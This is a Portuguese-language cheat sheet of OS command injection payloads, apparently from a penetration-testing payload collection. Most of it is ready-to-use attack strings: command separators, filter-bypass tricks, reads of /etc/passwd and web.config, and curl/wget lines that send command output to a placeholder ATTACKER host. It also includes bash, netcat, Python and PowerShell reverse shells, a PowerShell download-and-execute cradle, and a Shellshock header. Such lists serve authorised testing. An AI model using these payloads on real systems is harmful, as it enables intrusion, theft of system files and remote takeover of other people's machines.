# 💻 Payloads de injeção de comandos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

> **Notas de precisão:** Injeção de comandos depende de a entrada alcançar um interpretador de comandos ou contexto equivalente. Os separadores variam por shell: em [CMD](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd), o ponto e vírgula não é um separador geral; a secção Windows do original mistura convenções que exigem contexto. Em PowerShell, `&` também é um operador de invocação, não tem automaticamente o mesmo significado de encadeamento de CMD. Expansão de chavetas e algumas utilizações de `$IFS` dependem da shell. As opções de `nc` variam entre implementações. Percent-encoding só atua se a aplicação o descodificar. Os exemplos Shellshock exigem condições específicas e não são um comportamento genérico de User-Agent.

---

<a id="-command-separators"></a>
## 🎯 Separadores de comandos

### Linux/Unix
```bash
;       # Ponto e vírgula — executar a seguir
|       # Pipe — enviar a saída para o comando seguinte
||      # OU — executar se o primeiro falhar
&       # Executar em segundo plano
&&      # E — executar se o primeiro tiver êxito
`cmd`   # Acentos graves — substituição de comando
$(cmd)  # Dólar — substituição de comando
\n      # Mudança de linha — separar comandos
```

### Windows
```cmd
;       # Por vezes funciona (indicação do original; ver nota)
|       # Pipe (canalização)
||      # OU
&       # Executar ambos
&&      # E
\n      # Mudança de linha
%0a     # Mudança de linha codificada como URL
```

---

<a id="-basic-payloads"></a>
## 💉 Payloads básicos

### Teste simples
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### Codificado como URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # mudança de linha + id
```

---

<a id="-blind-command-injection"></a>
## 🔥 Injeção cega de comandos

### Deteção baseada no tempo
```bash
# Comandos de espera
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### Deteção baseada em DNS
```bash
# Utilizar nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Utilizar curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### Exfiltração baseada em HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

<a id="-filter-bypass-techniques"></a>
## 🛡️ Técnicas de contorno de filtros

### Contorno de filtros de espaços
```bash
# Utilizar $IFS (Internal Field Separator, separador interno de campos)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Utilizar tabulações
;cat	/etc/passwd

# Utilizar chavetas
{cat,/etc/passwd}
```

### Contorno de filtros de palavras-chave
```bash
# Dividir os comandos
w'h'oami
w"h"oami
who$@ami
who\ami

# Utilizar caracteres curinga
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Utilizar variáveis
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Codificação hexadecimal
echo -e "\x69\x64" | sh    # id
```

### Contorno de filtros de caracteres especiais
```bash
# Utilizar delimitadores diferentes
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Injeção de mudanças de linha
%0aid
%0Acat%20/etc/passwd

# Utilizar comentários
; id #
| id #
```

---

<a id="-linux-payloads"></a>
## 🐧 Payloads Linux

### Leitura de ficheiros
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Execução de comandos
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Shell inversa
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

<a id="-windows-payloads"></a>
## 🪟 Payloads Windows

### Comandos básicos
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Leitura de ficheiros
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Shell inversa
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

<a id="-common-injection-points"></a>
## 📝 Pontos de injeção comuns

```
Parâmetros de URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Parâmetros POST:
  filename=test.txt;id
  host=localhost|whoami

Cabeçalhos:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Nomes de ficheiros carregados:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

<a id="-testing-checklist"></a>
## 📋 Lista de verificação dos testes

```markdown
□ Testar todos os separadores de comandos (; | || & && ` $())
□ Testar versões codificadas como URL
□ Testar injeção cega baseada no tempo
□ Testar exfiltração por DNS/HTTP
□ Testar o contorno de filtros de espaços ($IFS, tabulações, chavetas)
□ Testar o contorno de filtros de palavras-chave (aspas, caracteres curinga)
□ Testar a injeção de mudanças de linha (%0a)
□ Verificar os caracteres filtrados
□ Experimentar comandos Linux e Windows
```

---

<a id="-related-payloads"></a>
## 🔗 Payloads relacionados

- [Payloads de LFI](LFI.pt.md)
- [Payloads de SSTI](SSTI.pt.md)

---

**Voltar aos payloads:** [💉 Coleção de payloads](../../README.md#-payloads-collection)
